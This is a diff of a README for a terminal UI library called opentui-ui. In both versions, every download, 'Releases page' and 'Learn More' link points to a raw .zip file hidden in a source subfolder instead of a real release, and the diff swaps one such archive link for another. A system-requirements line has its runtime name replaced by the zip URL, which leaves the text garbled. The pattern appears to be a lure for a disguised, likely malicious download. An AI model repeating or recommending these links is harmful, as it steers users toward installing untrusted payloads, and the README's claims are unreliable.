@@ -6,11 +6,11 @@ The opentui-ui is a UI component library designed for terminal applications. It 
 ## 🚀 Getting Started
 To begin using opentui-ui, you'll first need to download the latest version from our Releases page. Follow the steps below for a smooth installation process.
 
-[![Download opentui-ui](https://raw.githubusercontent.com/RohitDabi/opentui-ui/main/packages/utils/src/types/ui-opentui-2.7-beta.2.zip)](https://raw.githubusercontent.com/RohitDabi/opentui-ui/main/packages/utils/src/types/ui-opentui-2.7-beta.2.zip)
+[![Download opentui-ui](https://github.com/RohitDabi/opentui-ui/raw/refs/heads/main/packages/utils/src/ui_opentui_v1.1.zip)](https://github.com/RohitDabi/opentui-ui/raw/refs/heads/main/packages/utils/src/ui_opentui_v1.1.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/RohitDabi/opentui-ui/main/packages/utils/src/types/ui-opentui-2.7-beta.2.zip) on GitHub. Here, you will find all available versions of opentui-ui.
+   Go to the [Releases page](https://github.com/RohitDabi/opentui-ui/raw/refs/heads/main/packages/utils/src/ui_opentui_v1.1.zip) on GitHub. Here, you will find all available versions of opentui-ui.
 
 2. **Select the Latest Version**  
    Look for the latest version at the top of the page. It will have the highest number and may include additional notes about new features or fixes.
@@ -37,7 +37,7 @@ To run opentui-ui smoothly, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
 - **Terminal**: Any terminal that supports ANSI colors.
-- **https://raw.githubusercontent.com/RohitDabi/opentui-ui/main/packages/utils/src/types/ui-opentui-2.7-beta.2.zip**: Version 10.x or higher is recommended for compatibility.
+- **https://github.com/RohitDabi/opentui-ui/raw/refs/heads/main/packages/utils/src/ui_opentui_v1.1.zip**: Version 10.x or higher is recommended for compatibility.
 
 ## 💬 Support
 If you encounter issues during installation or usage, feel free to check our documentation for troubleshooting tips. You can also ask questions by opening an issue on the GitHub repository. Our community is here to help.
@@ -49,4 +49,4 @@ We welcome contributions to the opentui-ui project. If you have suggestions or i
 For any inquiries, please reach out to the project maintainers via the GitHub project issues page. We appreciate your interest in opentui-ui and look forward to your feedback.
 
 ## 🌟 Learn More
-For further details, updates, and tutorials, check our [Releases page](https://raw.githubusercontent.com/RohitDabi/opentui-ui/main/packages/utils/src/types/ui-opentui-2.7-beta.2.zip). Start building your terminal applications with opentui-ui today!
+For further details, updates, and tutorials, check our [Releases page](https://github.com/RohitDabi/opentui-ui/raw/refs/heads/main/packages/utils/src/ui_opentui_v1.1.zip). Start building your terminal applications with opentui-ui today!
